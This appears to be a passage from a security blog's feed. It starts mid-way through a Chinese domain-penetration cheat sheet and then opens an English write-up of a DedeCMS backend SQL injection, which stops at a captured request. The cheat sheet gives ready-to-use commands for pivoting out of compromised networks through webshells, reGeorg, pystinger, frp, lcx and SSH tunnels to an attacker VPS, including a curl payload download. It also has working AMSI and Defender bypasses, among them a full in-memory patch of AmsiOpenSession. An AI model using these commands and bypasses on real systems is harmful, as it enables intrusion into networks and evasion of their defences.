title="场景三：TCP不出网-HTTP代理"></a>场景三：TCP不出网-HTTP代理</h6><p><strong>一.reGeorg</strong></p><p>reGeorg原版：<a href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a><br>reGeorg修改版：<a href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a></p><p>假设拿到的Webshell是<a href="http://aaa.com/shell.jsp%EF%BC%8C%E4%BB%A5%E5%8E%9F%E7%89%88reGeorg%E4%B8%BA%E4%BE%8B%E3%80%82">http://aaa.com/shell.jsp，</a>以原版reGeorg为例。</p><p>上传reGeorg中的 tunnel.jsp，假设当前URL为<a href="http://aaa.com/tunnel.jsp">http://aaa.com/tunnel.jsp</a></p><p>在本地PC运行如下命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python reGeorgSocksProxy.py -p 8080 -h 0.0.0.0 -u http:&#x2F;&#x2F;aaa.com&#x2F;tunnel.jsp</span><br></pre></td></tr></table></figure><p>此时，将在本地PC的8080开启一个Socks端口，使用Proxifier即可进行代理。需要注意的是，由于这个http代理隧道比较脆弱，建议根据每个目标host单独添加规则，最好不要设置成全局代理。</p><p><strong>二.pystinger</strong></p><p>蜂刺-stinger_client</p><p><a href="https://github.com/FunnyWolf/pystinger">pystinger</a></p><p>整体结构：</p><p>1.上传 proxy.jsp到目标Web服务器，上传stinger_server/stinger_server.exe到目标系统。</p><p>2.使用Webshell启动stinger_server</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Linux:</span><br><span class="line">chmod +x &#x2F;tmp&#x2F;stinger_server</span><br><span class="line">nohup &#x2F;tmp&#x2F;stinger_server&gt;&#x2F;dev&#x2F;null nohup.out &amp;</span><br><span class="line"></span><br><span class="line">Windows: start D:&#x2F;XXX&#x2F;stinger_server.exe</span><br></pre></td></tr></table></figure><p>3.VPS服务端启动监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;stinger_client -w http:&#x2F;&#x2F;aaa.com&#x2F;proxy.jsp -l 0.0.0.0 -p 60000</span><br></pre></td></tr></table></figure><p>以上操作成功后，VPS会监听60000端口，接下来直接配置好Proxifier就可以访问目标内网了。</p><p>特别注意：这个代理也不是很稳定，有时候会断开(Wrong data)。遇到断开情况后，手动kill stinger_server进程 再启动，最后重启VPS服务端stinger_client即可</p><h6 id="场景四-TCP出网-socks代理"><a href="#场景四-TCP出网-socks代理" class="headerlink" title="场景四    TCP出网-socks代理"></a>场景四    TCP出网-socks代理</h6><p><strong><a href="https://github.com/fatedier/frp">frp</a></strong></p><p>搭建步骤：<br>1.VPS运行服务端</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;frps -c frps.ini</span><br></pre></td></tr></table></figure><p>注：建议用Screen将frp挂起到后台，Screen挂起程序参考<a href="https://www.jianshu.com/p/b24f597c0561">用screen 在后台运行程序 - 简书</a></p><p>frps.ini内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port &#x3D; 8080</span><br><span class="line">tls_only &#x3D; true</span><br><span class="line">tcp_mux &#x3D; true</span><br><span class="line">privilege_token &#x3D; token123</span><br><span class="line">kcp_bind_port &#x3D; 8080</span><br></pre></td></tr></table></figure><p>2.使用VPS将frpc frpc.ini上传到主机tmp目录，然后运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Linux:</span><br><span class="line">chmod +x &#x2F;tmp&#x2F;frpc-x86</span><br><span class="line">nohup &#x2F;tmp&#x2F;frpc-x86 -c &#x2F;tmpfrpc.ini&gt;&#x2F;dev&#x2F;null nohup.out &amp;</span><br><span class="line"></span><br><span class="line">Windows</span><br><span class="line">frpc -c frpc.ini</span><br></pre></td></tr></table></figure><p>注：有时候用Webshell管理工具会上传失败或上传文件不完整，可以cd到frp目录，在vps使用 <code>python -m SimpleHTTPServer 80</code> 启动一个webserver，然后在客户端使用 <code>curl http://vpsip/frpc</code>下载文件。</p><p>以上操作成功后，VPS控制台会有输出，然后VPS会启动一个10001端口，接下来直接配置好Proxifier就可以访问目标内网了。</p><p>Proxifier使用参考：<a href="https://blog.csdn.net/u013600314/article/details/106276126/">Proxifier Socks5 代理（内网访问、远程办公）</a></p><p>ps：frp会涉及到免杀的问题，这里推荐另一个代理工具，体积更小，可以看作是rust版本的frp </p><p> <a href="https://github.com/editso/fuso">fuso</a></p><h4 id="0x02-Lcx"><a href="#0x02-Lcx" class="headerlink" title="0x02 Lcx"></a>0x02 Lcx</h4><p>内网IP：192.168.183.168<br>公网IP：192.168.183.181</p><h5 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h5><p>内网机器上执行命令：<code>lcx.exe –slave 公网IP 端口 内网IP 端口</code><br>将内网的3389端口转发到公网的6666端口</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -slave <span class="number">192.168</span><span class="number">.183</span><span class="number">.181</span> <span class="number">6666</span> <span class="number">192.168</span><span class="number">.183</span><span class="number">.168</span> <span class="number">3389</span></span><br><span class="line">lcx.exe -slave <span class="number">192.168</span><span class="number">.183</span><span class="number">.181</span> <span class="number">6666</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">3389</span></span><br></pre></td></tr></table></figure><p>公网机器上执行命令：<code>lcx.exe -listen 监听端口 连接端口</code><br>将在6666端口接收到的数据转发到2222端口</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -listen <span class="number">6666</span> <span class="number">2222</span></span><br></pre></td></tr></table></figure><p>使用命令<code>mstsc /v:127.0.0.1:2222</code>即可连接到内网3389端口</p><h5 id="端口映射"><a href="#端口映射" class="headerlink" title="端口映射"></a>端口映射</h5><p>如果内网机器防火墙禁止3389出站，可以使用tran命令将3389端口映射到其他端口上<br>内网机器上执行命令：<code>lcx.exe -tran 映射端口 连接IP 连接端口</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -tran <span class="number">66</span> <span class="number">192.168</span><span class="number">.183</span><span class="number">.168</span> <span class="number">3389</span></span><br></pre></td></tr></table></figure><p>因为实验环境是内网所以直接连接66端口即可访问3389端口，公网还需要端口转发</p><h4 id="0x03-SSH隧道"><a href="#0x03-SSH隧道" class="headerlink" title="0x03  SSH隧道"></a>0x03  SSH隧道</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ssh参数详解：</span><br><span class="line">    -C Enable compression 压缩数据传输</span><br><span class="line">    -q Quiet mode. 安静模式</span><br><span class="line">    -T Disable pseudo-tty allocation. 不占用 shell</span><br><span class="line">    -f Requests ssh to go to background just before command execution. 后台运行，并推荐加上 -n 参数</span><br><span class="line">    -N Do not execute a remote command. 不执行远程命令，端口转发就用它</span><br><span class="line">    -L port:host:hostport 将本地机(客户机)的某个端口转发到远端指定机器的指定端口. </span><br><span class="line">    -R port:host:hostport 将远程主机(服务器)的某个端口转发到本地端指定机器的指定端口. </span><br><span class="line">    -D port 指定一个本地机器动态的应用程序端口转发. </span><br><span class="line">    -g port 允许远程主机连接到建立的转发的端口，如果不加这个参数，只允许本地主机建立连接</span><br></pre></td></tr></table></figure><h5 id="SSH本地转发"><a href="#SSH本地转发" class="headerlink" title="SSH本地转发"></a>SSH本地转发</h5><p>语法格式：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L [local_bind_addr:]local_port:remote:remote_port middle_host</span><br></pre></td></tr></table></figure><p>远程管理服务器上的mysql，mysql不能直接root远程登陆。这时候就可以通过本地转发，通过ssh将服务器的3306端口转发到1234端口。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -L <span class="number">2222</span>:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">3306</span> root@<span class="number">139.196</span>.xx.xx</span><br></pre></td></tr></table></figure><p>工作原理：在本地指定一个由ssh监听的转发端口2222，将远程主机的3306端口(127.0.0.1:3306)映射到本地的2222端口，当有主机连接本地映射的2222端口时，本地ssh就将此端口的数据包转发给中间主机VPS，然后VPS再与远程主机端口(127.0.0.1:3306)通信。<br>数据流向：Kali -&gt; 2222 -&gt; VPS -&gt; 127.0.0.1:3306</p><h5 id="SSH远程转发"><a href="#SSH远程转发" class="headerlink" title="SSH远程转发"></a>SSH远程转发</h5><p>语法格式：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -R [bind_addr:]remote1_port:host:port remote1</span><br></pre></td></tr></table></figure><p>假设kali开了一个80端口的web服务，外网无法访问，使用远程转发，将kali的80端口转发到外网的其他端口，这时候访问外网的端口，就访问到了内网的端口。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -R <span class="number">4444</span>:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">80</span> root@<span class="number">192.168</span><span class="number">.183</span><span class="number">.195</span></span><br></pre></td></tr></table></figure><p>此时在192.168.183.195这台主机上访问127.0.0.1:4444端口即可访问到kali的80端口<br>工作原理：kali在请求外网主机的sshd服务，在外网主机上建立一个套接字监听端口(4444)，它是kali的80端口的映射，当有主机连接外网的4444端口时，连接的数据全部转发给kali，再由kali去访问127.0.0.1:80。</p><p>这里要注意一点，远程端口转发是由远程主机上的sshd服务控制的，默认配置情况下，sshd服务只允许本地开启的远程转发端口(4444)绑定在环回地址(127.0.0.1)上，即使显式指定了bind_addr也无法覆盖。也就是这里访问127.0.0.1:4444端口可以访问成功，访问192.168.183.195:4444却不能访问成功。</p><p>要允许本地的远程转发端口绑定在非环回地址上，需要在外网主机的sshd配置文件中启用”GatewayPorts”项，它的默认值为no，这里将它改为yes。然后重新远程转发一下即可用外网地址访问。</p><h5 id="SSH动态转发-正向代理做动态的端口转发"><a href="#SSH动态转发-正向代理做动态的端口转发" class="headerlink" title="SSH动态转发,正向代理做动态的端口转发"></a>SSH动态转发,正向代理做动态的端口转发</h5><p>本地或远程转发端口和目标端口所代表的应用层协议是一对一的关系，不同的服务就要建立不同的端口，工作很是繁琐，而动态转发只需绑定一个本地端口，而目标端口是根据你发起的请求决定的，比如请求为445端口，通过ssh转发的请求也是445端口。</p><p>语法格式：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -D [bind_addr:]port remote</span><br></pre></td></tr></table></figure><p>这里举一个最简单的列子：翻墙。国内正常情况下上不了Google，我们可以通过将流量转发到国外的vps上这样就可以正常访问了。<br>在本地执行以下命令，并查看建立连接情况</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -Nfg -D <span class="number">3333</span> root@<span class="number">45.77</span>.xx.xx</span><br></pre></td></tr></table></figure><p>连接建立成功，设置浏览器到本地主机的3333端口</p><h5 id="SSH动态转发，正向代理进行单一的端口转发"><a href="#SSH动态转发，正向代理进行单一的端口转发" class="headerlink" title="SSH动态转发，正向代理进行单一的端口转发"></a>SSH动态转发，正向代理进行单一的端口转发</h5><p>利用ssh -L 提供正向代理，将192.168.183.2的80端口映射到45.77.xx.xx的1111端口上</p><p>访问45.77.xx.xx:1111相当于访问192.168.183.2:80 中间需要192.168.183.1的ssh进行正向代理进行利用。</p><p>语法格式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 45.77.xx.xx:1111:192.168.183.2:80 root@192.168.183.1</span><br></pre></td></tr></table></figure><p>此时我们访问45.77.xx.xx的1111端口就相当于访问内网不出网机器的192.168.183.2:80</p><h1 id="16-Bypass-AMSI"><a href="#16-Bypass-AMSI" class="headerlink" title="16.Bypass AMSI"></a>16.Bypass AMSI</h1><p><a href="https://0range-x.github.io/2022/01/23/AMSI/">How to Bypass AMSI </a></p><p>管理员权限关闭amsi</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-MpPreference</span> <span class="literal">-DisableRealtimeMonitoring</span> <span class="variable">$true</span></span><br></pre></td></tr></table></figure><h3 id="一键关闭AMSI"><a href="#一键关闭AMSI" class="headerlink" title="一键关闭AMSI"></a>一键关闭AMSI</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="type">Ref</span>].Assembly.GetType(<span class="string">&#x27;System.Management.Automation.AmsiUtils&#x27;</span>).GetField(<span class="string">&#x27;amsiInitFailed&#x27;</span>,<span class="string">&#x27;NonPubilc,Static&#x27;</span>).SetValue(<span class="variable">$null</span>,<span class="variable">$true</span>)</span><br></pre></td></tr></table></figure><p>被加黑了，可以混淆过</p><h3 id="powershell降级"><a href="#powershell降级" class="headerlink" title="powershell降级"></a>powershell降级</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -version 2   &#x2F;&#x2F;改变powershell运行版本</span><br></pre></td></tr></table></figure><h3 id="内存补丁"><a href="#内存补丁" class="headerlink" title="内存补丁"></a>内存补丁</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">$p=<span class="string">@&quot;</span></span><br><span class="line"><span class="string">using System;</span></span><br><span class="line"><span class="string">using System.Linq;</span></span><br><span class="line"><span class="string">using System.Runtime.InteropServices;</span></span><br><span class="line"><span class="string">public class Program</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">[DllImport(&quot;</span>kernel32<span class="string">&quot;)]</span></span><br><span class="line"><span class="string">public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);</span></span><br><span class="line"><span class="string">[DllImport(&quot;</span>kernel32<span class="string">&quot;)]</span></span><br><span class="line"><span class="string">public static extern IntPtr LoadLibrary(string name);</span></span><br><span class="line"><span class="string">[DllImport(&quot;</span>kernel32<span class="string">&quot;)]</span></span><br><span class="line"><span class="string">public static extern IntPtr VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,</span></span><br><span class="line"><span class="string">uint flNewProtect, out uint lpfloldProtect);</span></span><br><span class="line"><span class="string">public static void Bypass()</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">String a =</span></span><br><span class="line"><span class="string">&quot;</span>isma<span class="string">&quot;;</span></span><br><span class="line"><span class="string">IntPtr lib = LoadLibrary(String.Join(&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">, a.Reverse().ToArray()) +</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line">.dll<span class="string">&quot;);</span></span><br><span class="line"><span class="string">IntPtr addr = GetProcAddress(lib,</span></span><br><span class="line"><span class="string">&quot;</span>AmsiOpenSession<span class="string">&quot;);</span></span><br><span class="line"><span class="string">uint old = 0;</span></span><br><span class="line"><span class="string">byte[] p;</span></span><br><span class="line"><span class="string">p = new byte[6];</span></span><br><span class="line"><span class="string">p[0] = 0xB8;</span></span><br><span class="line"><span class="string">p[1] = 0xFF;</span></span><br><span class="line"><span class="string">p[2] = 0xFF;</span></span><br><span class="line"><span class="string">p[3] = 0xFF;</span></span><br><span class="line"><span class="string">p[4] = 0xFF;</span></span><br><span class="line"><span class="string">p[5] = 0xC3;</span></span><br><span class="line"><span class="string">VirtualProtect(addr, (UIntPtr)p.Length, 0x04, out old);</span></span><br><span class="line"><span class="string">Marshal.Copy(p, 0, addr, p.Length);</span></span><br><span class="line"><span class="string">VirtualProtect(addr, (UIntPtr)p.Length, old, out old);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;</span>@</span><br><span class="line">Add-Type $p</span><br><span class="line">[Program]::Bypass()</span><br></pre></td></tr></table></figure><p>参考链接：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;NyDubh3&#x2F;Pentesting-Active-Directory-CN</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;shmilylty&#x2F;Intranet_Penetration_Tips</span><br><span class="line">https:&#x2F;&#x2F;0range-x.github.io&#x2F;2022&#x2F;01&#x2F;26&#x2F;Domain-penetration_one-stop&#x2F;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">域渗透速查手册</summary>
    
    
    
    <category term="域渗透" scheme="http://nice759.com/Categories/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="域渗透" scheme="http://nice759.com/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Dedecms background SQL injection vulnerability</title>
    <link href="http://nice759.com/2021/03/26/Dedecmsv5.8%20SQL%20Injection/"/>
    <id>http://nice759.com/2021/03/26/Dedecmsv5.8%20SQL%20Injection/</id>
    <published>2021-03-26T08:49:53.000Z</published>
    <updated>2021-03-26T09:55:36.282Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Vulnerability-Profile"><a href="#Vulnerability-Profile" class="headerlink" title="Vulnerability Profile"></a>Vulnerability Profile</h1><p>DedecMS is a PHP website management system developed by ZhiMeng team. It features simplicity, ease of use and high efficiency, and sets up a variety of websites with distinctive features, such as local portals, industry portals, government and enterprise sites, etc.</p><p>On <a href="https://github.com/dedecms/DedeCMS">Dedecms’ official GitHub home page</a>, they updated Dedecms to the <code>v5.8.1.11 beta</code> a week ago.However, in the background file <code>MAKEHTM_FREELIST_ACTION.php</code> for this version, there is a loose parameter filtering situation, which leads to the SQL injection vulnerability.Malicious hackers can use this vulnerability to gain access to sensitive data or host permissions.</p><h1 id="Affected-Area"><a href="#Affected-Area" class="headerlink" title="Affected Area"></a>Affected Area</h1><p><strong>DedeCMS v5.8.1.11 beta</strong>（Lower versions will be serious in subsequent updates）</p><h1 id="Vulnerability-Type"><a href="#Vulnerability-Type" class="headerlink" title="Vulnerability Type"></a>Vulnerability Type</h1><p>SQL Injection</p><h1 id="Recurring-Environment"><a href="#Recurring-Environment" class="headerlink" title="Recurring Environment"></a>Recurring Environment</h1><p><strong>CMS version number：V5.8.1</strong><br><strong>PHP version：7.3.4</strong><br><strong>MYSQL version：5.70</strong></p><h1 id="Code-Analysis"><a href="#Code-Analysis" class="headerlink" title="Code Analysis"></a>Code Analysis</h1><p>Vulnerability code located in <code>dede/makehtml_freelist_action.php</code>,Here is the vulnerability code</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;**</span><br><span class="line"> * 生成自由列表操作</span><br><span class="line"> *</span><br><span class="line"> * @version   $Id: makehtml_freelist_action.php 1 9:11 2010年7月19日 $</span><br><span class="line"> * @package   DedeCMS.Administrator</span><br><span class="line"> * @founder   IT柏拉图, https:&#x2F;&#x2F;weibo.com&#x2F;itprato</span><br><span class="line"> * @author    DedeCMS团队</span><br><span class="line"> * @copyright Copyright (c) 2007 - 2021, 上海卓卓网络科技有限公司 (DesDev, Inc.)</span><br><span class="line"> * @license   http:&#x2F;&#x2F;help.dedecms.com&#x2F;usersguide&#x2F;license.html</span><br><span class="line"> * @link      http:&#x2F;&#x2F;www.dedecms.com</span><br><span class="line"> *&#x2F;</span><br><span class="line">require_once dirname(__FILE__) . &quot;&#x2F;config.php&quot;;</span><br><span class="line">CheckPurview(&#39;sys_MakeHtml&#39;);</span><br><span class="line">require_once DEDEINC . &quot;&#x2F;arc.freelist.class.php&quot;;</span><br><span class="line">if (empty($startid)) &#123;</span><br><span class="line">    $startid &#x3D; 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ci &#x3D; &quot; aid &gt;&#x3D; $startid &quot;;</span><br><span class="line">if (!empty($endid) &amp;&amp; $endid &gt;&#x3D; $startid) &#123;</span><br><span class="line">    $ci .&#x3D; &quot; And aid &lt;&#x3D; $endid &quot;;</span><br><span class="line">&#125;</span><br><span class="line">header(&quot;Content-Type: text&#x2F;html; charset&#x3D;&#123;$cfg_soft_lang&#125;&quot;);</span><br><span class="line">$dsql-&gt;SetQuery(&quot;Select aid From #@__freelist where $ci&quot;);</span><br><span class="line">$dsql-&gt;Execute();</span><br><span class="line">while ($row &#x3D; $dsql-&gt;GetArray()) &#123;</span><br><span class="line">    $idArray[] &#x3D; $row[&#39;aid&#39;];</span><br><span class="line">&#125;</span><br><span class="line">if (!isset($pageno)) &#123;</span><br><span class="line">    $pageno &#x3D; 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (empty($idArray)) &#123;</span><br><span class="line">    $idArray &#x3D; &#39;&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$totalpage &#x3D; count($idArray);</span><br><span class="line">if (isset($idArray[$pageno])) &#123;</span><br><span class="line">    $lid &#x3D; $idArray[$pageno];</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    ShowMsg(&quot;完成所有文件创建！&quot;, &#39;javascript:;&#39;);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">$lv &#x3D; new FreeList($lid);</span><br><span class="line">$ntotalpage &#x3D; $lv-&gt;TotalPage;</span><br><span class="line">if (empty($mkpage)) &#123;</span><br><span class="line">    $mkpage &#x3D; 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (empty($maxpagesize)) &#123;</span><br><span class="line">    $maxpagesize &#x3D; 50;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;如果栏目的文档太多，分多批次更新</span><br><span class="line">if ($ntotalpage &lt;&#x3D; $maxpagesize) &#123;</span><br><span class="line">    $lv-&gt;MakeHtml();</span><br><span class="line">    $finishType &#x3D; true;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $lv-&gt;MakeHtml($mkpage, $maxpagesize);</span><br><span class="line">    $finishType &#x3D; false;</span><br><span class="line">    $mkpage &#x3D; $mkpage + $maxpagesize;</span><br><span class="line">    if ($mkpage &gt;&#x3D; ($ntotalpage + 1)) &#123;</span><br><span class="line">        $finishType &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$lv-&gt;Close();</span><br><span class="line">$nextpage &#x3D; $pageno + 1;</span><br><span class="line">if ($nextpage &#x3D;&#x3D; $totalpage) &#123;</span><br><span class="line">    ShowMsg(&quot;完成所有文件创建！&quot;, &#39;javascript:;&#39;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    if ($finishType) &#123;</span><br><span class="line">        $gourl &#x3D; &quot;makehtml_freelist_action.php?maxpagesize&#x3D;$maxpagesize&amp;startid&#x3D;$startid&amp;endid&#x3D;$endid&amp;pageno&#x3D;$nextpage&quot;;</span><br><span class="line">        ShowMsg(&quot;成功创建列表：&quot; . $tid . &quot;，继续进行操作！&quot;, $gourl, 0, 100);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $gourl &#x3D; &quot;makehtml_freelist_action.php?mkpage&#x3D;$mkpage&amp;maxpagesize&#x3D;$maxpagesize&amp;startid&#x3D;$startid&amp;endid&#x3D;$endid&amp;pageno&#x3D;$pageno&quot;;</span><br><span class="line">        ShowMsg(&quot;列表：&quot; . $tid . &quot;，继续进行操作...&quot;, $gourl, 0, 100);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$dsql-&gt;ExecuteNoneQuery(&quot;Update &#96;#@__freelist&#96; set  nodefault&#x3D;&#39;1&#39; where aid&#x3D;&#39;$startid&#39;;&quot;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>The problem is very simple. You can see that in line 16, a judgment is made on <code>starid</code>. If the value of this parameter is <strong>NULL</strong>, then <code>0</code> is assigned to <code>starid</code>. Then on line 20, the value of <code>starid</code> is passed to <code>ci</code>, but on line 25, <code>ci</code> is concatenated into the database statement without any filtering, causing the problem<br><img src="https://img.imgdb.cn/item/605da8168322e6675c7178c4.png"></p><h1 id="Local-Recurrence"><a href="#Local-Recurrence" class="headerlink" title="Local Recurrence"></a>Local Recurrence</h1><p>Download the source code on GitHub for installation, source address:<strong><a href="https://github.com/dedecms/DedeCMS">https://github.com/dedecms/DedeCMS</a></strong><br>Use the account password set at the time of installation to enter the background, the default is <code>admin/admin</code><br>completing:<br><img src="https://img.imgdb.cn/item/605daafc8322e6675c7356f6.png"></p><p>Enter the vulnerability point：<code>http://192.168.5.62:81/dede/makehtml_freelist_action.php?startid=2</code>,Use the BurpSuit to grab the packet from this page</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;dede&#x2F;makehtml_freelist_action.php?startid&#x3D;2 HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.5.62:81</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;88.0.4324.150 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: 